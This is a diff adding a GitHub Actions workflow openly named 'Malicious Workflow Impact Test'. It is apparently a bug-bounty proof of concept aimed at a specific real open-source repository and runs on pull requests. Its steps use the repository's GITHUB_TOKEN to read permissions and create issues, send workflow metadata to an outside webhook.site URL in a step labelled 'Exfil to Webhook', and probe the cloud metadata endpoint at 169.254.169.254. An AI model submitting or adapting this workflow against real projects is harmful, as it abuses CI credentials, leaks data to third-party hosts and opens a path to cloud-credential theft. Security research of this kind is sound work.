@@ -1,0 +1,46 @@
+name: Malicious Workflow Impact Test
+on: [pull_request]
+permissions:
+  issues: write
+  contents: read
+jobs:
+  demonstrate-impact:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Environment Capture
+      run: |
+        echo "::notice:: Actor: ${{ github.actor }}"
+        echo "::notice:: Repo: ${{ github.repository }}"
+        echo "::notice:: PR: ${{ github.event.pull_request.number }}"
+    
+    - name: Test GITHUB_TOKEN Read
+      run: |
+        RESPONSE=$(curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          https://api.github.com/repos/PlaytikaOSS/feign-reactive)
+        echo "$RESPONSE" | jq '.permissions // "No jq available"'
+    
+    - name: Test Issue Creation (SAFE)
+      id: create-issue
+      run: |
+        ISSUE_RESPONSE=$(curl -s -w "%{http_code}" -X POST \
+          https://api.github.com/repos/PlaytikaOSS/feign-reactive/issues \
+          -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          -H "Content-Type: application/json" \
+          -d '{
+            "title": "[SECURITY DEMO] Workflow Permissions Test PR #${{ github.event.pull_request.number }}",
+            "body": "Automated HackerOne report demo. Safe to delete.",
+            "labels": ["security", "test"]
+          }')
+        HTTP_CODE=${ISSUE_RESPONSE: -3}
+        echo "HTTP Response Code: $HTTP_CODE" >> $GITHUB_STEP_SUMMARY
+        echo "Issue creation: $HTTP_CODE" >> $GITHUB_STEP_SUMMARY
+    
+    - name: Exfil to Webhook
+      run: |
+        curl "https://webhook.site/ff7df6bc-b878-4b8f-b0f0-294f22f56a5b?impact=1&actor=${{ github.actor }}&repo=${{ github.repository }}&pr=${{ github.event.pull_request.number }}"
+    
+    - name: Metadata SSRF
+      run: |
+        METADATA=$(curl -s --max-time 5 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || echo "BLOCKED")
+        echo "Metadata access: $METADATA" >> $GITHUB_STEP_SUMMARY
+
